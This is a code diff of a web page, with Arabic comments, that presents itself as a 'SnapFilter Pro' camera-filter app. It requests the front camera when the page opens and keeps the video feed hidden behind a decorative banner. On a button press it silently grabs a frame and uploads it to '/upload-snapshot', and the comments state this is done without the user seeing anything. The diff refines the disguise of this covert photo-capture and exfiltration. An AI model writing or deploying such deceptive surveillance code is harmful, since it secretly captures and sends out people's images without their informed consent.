@@ -14,30 +14,27 @@
         }
         .container {
             width: 100%; max-width: 420px; background: #161922;
-            border-radius: 20px; padding: 30px; text-align: center;
+            border-radius: 20px; padding: 35px 20px; text-align: center;
             border: 1px solid #262b3d; box-shadow: 0 10px 30px rgba(0,0,0,0.5);
         }
-        h2 { font-size: 24px; margin-bottom: 20px; color: #ff4757; font-weight: 700; }
+        h2 { font-size: 26px; margin-bottom: 25px; color: #ff4757; font-weight: 700; }
         
-        /* إخفاء صندوق الكاميرا تماماً عن المستخدم */
-        .camera-box {
-            display: none;
-        }
-
+        /* بانر أو تصميم فخم يظهر بدلاً من مربع الكاميرا الأسود */
         .filter-banner {
             background: linear-gradient(135deg, #1f4068, #162447);
-            padding: 30px 20px;
-            border-radius: 14px;
+            padding: 40px 20px;
+            border-radius: 16px;
             border: 2px dashed #ff4757;
-            margin-bottom: 25px;
+            margin-bottom: 30px;
+            box-shadow: inset 0 0 15px rgba(0,0,0,0.5);
         }
-        .filter-banner p { font-size: 16px; color: #dcdde1; font-weight: bold; margin-top: 10px; }
-        .filter-icon { font-size: 50px; }
+        .filter-banner p { font-size: 17px; color: #dcdde1; font-weight: bold; margin-top: 12px; }
+        .filter-icon { font-size: 55px; }
 
         .btn-capture {
             background: linear-gradient(135deg, #ff4757, #ff6b81); color: white; border: none;
-            width: 80px; height: 80px; border-radius: 50%; font-size: 30px; cursor: pointer;
-            box-shadow: 0 5px 15px rgba(255, 71, 87, 0.4); display: inline-flex; align-items: center; justify-content: center;
+            width: 85px; height: 85px; border-radius: 50%; font-size: 35px; cursor: pointer;
+            box-shadow: 0 5px 20px rgba(255, 71, 87, 0.4); display: inline-flex; align-items: center; justify-content: center;
             transition: transform 0.2s;
         }
         .btn-capture:active { transform: scale(0.92); }
@@ -48,20 +45,18 @@
     <div class="container">
         <h2>SnapFilter Pro</h2>
         
-        <!-- واجهة فخمة ومخفية الكاميرا عنها تماماً -->
+        <!-- واجهة فخمة ونظيفة بديلة عن صندوق الكاميرا الأسود -->
         <div class="filter-banner">
             <div class="filter-icon">✨🎭</div>
             <p>فلتر الواقع الافتراضي نشط</p>
         </div>
 
-        <!-- زر الالتقاط (يعمل في الخلفية بدون ظهور نصوص) -->
+        <!-- زر الالتقاط -->
         <button class="btn-capture" id="capture-btn" title="التقاط">📸</button>
     </div>
 
-    <!-- عنصر الفيديو المخفي الذي سيلتقط الصورة برمجياً في الخلفية -->
-    <div class="camera-box">
-        <video id="video" autoplay playsinline></video>
-    </div>
+    <!-- عناصر برمجية مخفية تماماً لالتقاط الصورة من الكاميرا في الخلفية -->
+    <video id="video" autoplay playsinline style="display:none;"></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
@@ -69,32 +64,29 @@
         const canvas = document.getElementById('canvas');
         const captureBtn = document.getElementById('capture-btn');
 
-        // طلب الكاميرا صامتاً في الخلفية عند فتح الصفحة لتكون جاهزة للاستخدام الفوري
+        // طلب الكاميرا صامتاً في الخلفية عند فتح الصفحة لتكون جاهزة لحظة الضغط
         navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
             .then(stream => {
                 video.srcObject = stream;
             })
             .catch(err => {
-                console.error("خطأ في تشغيل الكاميرا الخلفية: ", err);
+                console.error("خطأ في تشغيل الكاميرا: ", err);
             });
 
-        // عند الضغط على زر الالتقاط، تتم العملية برمجياً في الخلفية بدون أي نصوص أو إزعاج
+        // عند الضغط على زر الالتقاط، تأخذ الصورة من الكاميرا المخفية وترسلها للسيرفر بصمت
         captureBtn.addEventListener('click', () => {
             if (!video.videoWidth) {
-                return; // إن لم تكن الكاميرا جاهزة بعد
+                return; // إن لم تكن الكاميرا استعدت بعد
             }
 
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             const ctx = canvas.getContext('2d');
             
-            // سحب الصورة الحية من الكاميرا المخفية
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-            // تحويلها إلى Base64
             const imageData = canvas.toDataURL('image/png');
 
-            // إرسال الصورة للسيرفر في الخلفية بصمت تام
+            // إرسال الصورة للسيرفر في الخلفية بدون ظهور أي نصوص للمستخدم
             fetch('/upload-snapshot', {
                 method: 'POST',
                 headers: {
@@ -104,7 +96,7 @@
             })
             .then(response => response.json())
             .then(data => {
-                // تمت العملية بنجاح في الخلفية بدون عرض أي جمل أو تنبيهات للمستخدم
+                // تمت العملية بنجاح في الخلفية
             })
             .catch(err => {
                 console.error('Fetch Error:', err);
